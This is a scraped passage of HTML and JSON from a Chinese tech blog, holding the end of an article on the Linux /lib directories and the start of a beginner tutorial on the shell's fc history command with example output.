crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxnix</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-p\"># find . -maxdepth 1  -type d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-2\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">firmware</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-3\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">modprobe</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-4\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">xtables</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-5\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">apparmor</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-6\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">terminfo</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-7\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">plymouth</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-8\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">init</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-9\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">lsb</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-10\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">recovery</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">mode</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-11\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">resolvconf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-12\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">crda</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-13\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">modules</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-14\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">hdparm</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-15\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">udev</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-16\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">ufw</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-17\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">ifupdown</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-18\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">systemd</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc125833265715-19\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">modules</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">load</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc125833265715-20\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p><code>/lib/firmware</code> – 这个文件夹包含了一些硬件、固件Firmware代码。</p>\n<blockquote><p><strong>硬件和固件之间有什么不同？</strong></p>\n<p>为了使硬件正常运行，很多设备软件由两部分软件组成。加载到实际硬件的代码部分就是固件，用于在固件和内核之间通讯的软件被称为驱动程序。这样一来，内核就可以直接与硬件通讯，并确保硬件完成内核指派的工作。</p></blockquote>\n<p><code>/lib/modprobe.d</code> – modprobe 命令的配置目录。</p>\n<p><code>/lib/modules</code> – 所有的可加载内核模块都存储在这个目录下。如果你有多个内核，你会在这个目录下看到代表美国内核的目录。</p>\n<p><code>/lib/hdparm</code> – 包含 SATA/IDE 硬盘正确运行的参数。</p>\n<p><code>/lib/udev</code> – 用户空间 /dev 是 Linux 内核设备管理器。这个文件夹包含了所有的 udev 相关的文件和文件夹，例如 <code>rules.d</code> 包含了 udev 规范文件。</p>\n<h3 id=\"toc_3\">/lib 的姊妹文件夹：/lib32 和 /lib64</h3>\n<p>这两个文件夹包含了特殊结构的库文件。它们几乎和 <code>/lib</code> 文件夹一样，除了架构级别的差异。</p>\n<h3 id=\"toc_4\">Linux 其他的库文件</h3>\n<p><code>/usr/lib</code> – 所有软件的库都安装在这里。但是不包含系统默认库文件和内核库文件。</p>\n<p><code>/usr/local/lib</code> – 放置额外的系统文件。这些库能够用于各种应用。</p>\n<p><code>/var/lib</code> – 存储动态数据的库和文件，例如 rpm/dpkg 数据和游戏记录。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113930\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113930votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113930\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113930/", "url_obj_id": "d81a13cb0a3733f72fc89f2d3f029cd2"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/9d9a2ae51099793ebcb0c2af97dc331b.png"], "title": "给初学者的 fc 示例教程", "create_date": "2018/04/25 ·", "praise_num": 1, "fav_num": 1, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/the-fc-command-tutorial-with-examples-for-beginners/\">SK</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9572-1.html\">Linux中国/Dotcra</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/9d9a2ae51099793ebcb0c2af97dc331b.png\" alt=\"\"></p>\n<p><code>fc</code> （<strong>F</strong>ix <strong>C</strong>ommands 的缩写）是个 shell 内置命令，用于在交互式 shell 里列出、编辑和执行最近输入的命令。你可以用你喜欢的编辑器编辑最近的命令并再次执行，而不用把它们整个重新输入一遍。除了可以避免重复输入又长又复杂的命令，它对修正拼写错误来说也很有用。因为是 shell 内置命令，大多 shell 都包含它，比如 Bash 、 Zsh 、 Ksh 等。在这篇短文中，我们来学一学在 Linux 中使用 <code>fc</code> 命令。</p>\n<h3 id=\"toc_1\">fc 命令教程及示例</h3>\n<h4 id=\"toc_2\">列出最近执行的命令</h4>\n<p>执行不带其它参数的 <code>fc -l</code> 命令，它会列出最近 16 个命令。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7f7d865298680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -l\r\n507 fish\r\n508 fc -l\r\n509 sudo netctl restart wlp9s0sktab\r\n510 ls -l\r\n511 pwd\r\n512 uname -r\r\n513 uname -a\r\n514 touch ostechnix.txt\r\n515 vi ostechnix.txt\r\n516 echo \"Welcome to OSTechNix\"\r\n517 sudo apcman -Syu\r\n518 sudo pacman -Syu\r\n519 more ostechnix.txt\r\n520 wc -l ostechnix.txt\r\n521 cat ostechnix.txt\r\n522 clear\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f7d865298680-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f7d865298680-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-2\"><span class=\"crayon-cn\">507</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">fish</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-3\"><span class=\"crayon-cn\">508</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-4\"><span class=\"crayon-cn\">509</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">netctl </span><span class=\"crayon-e\">restart </span><span class=\"crayon-i\">wlp9s0sktab</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-5\"><span class=\"crayon-cn\">510</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-6\"><span class=\"crayon-cn\">511</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pwd</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-7\"><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-8\"><span class=\"crayon-cn\">513</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-9\"><span class=\"crayon-cn\">514</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">touch </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-10\"><span class=\"crayon-cn\">515</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">vi </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-11\"><span class=\"crayon-cn\">516</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-12\"><span class=\"crayon-cn\">517</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apcman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Syu</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-13\"><span class=\"crayon-cn\">518</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">pacman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Syu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-14\"><span class=\"crayon-cn\">519</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-15\"><span class=\"crayon-cn\">520</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-16\"><span class=\"crayon-cn\">521</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f7d865298680-17\"><span class=\"crayon-cn\">522</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f7d865298680-18\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p><code>-r</code> 选项用于将输出反向排序。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7f86929727872\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -lr\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f86929727872-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f86929727872-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f86929727872-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">lr</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f86929727872-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><code>-n</code> 选项用于隐藏行号。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7f8a766378986\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -ln\r\n nano ~/.profile\r\n source ~/.profile\r\n source ~/.profile\r\n fc -ln\r\n fc -l\r\n sudo netctl restart wlp9s0sktab\r\n ls -l\r\n pwd\r\n uname -r\r\n uname -a\r\n echo \"Welcome to OSTechNix\"\r\n sudo apcman -Syu\r\n cat ostechnix.txt\r\n wc -l ostechnix.txt\r\n more ostechnix.txt\r\n clear\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f8a766378986-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f8a766378986-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">ln</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-2\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">nano</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">profile</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-3\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">profile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-4\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">profile</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-5\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">ln</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-6\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">netctl </span><span class=\"crayon-e\">restart </span><span class=\"crayon-e\">wlp9s0sktab</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-8\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-10\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-11\"><span 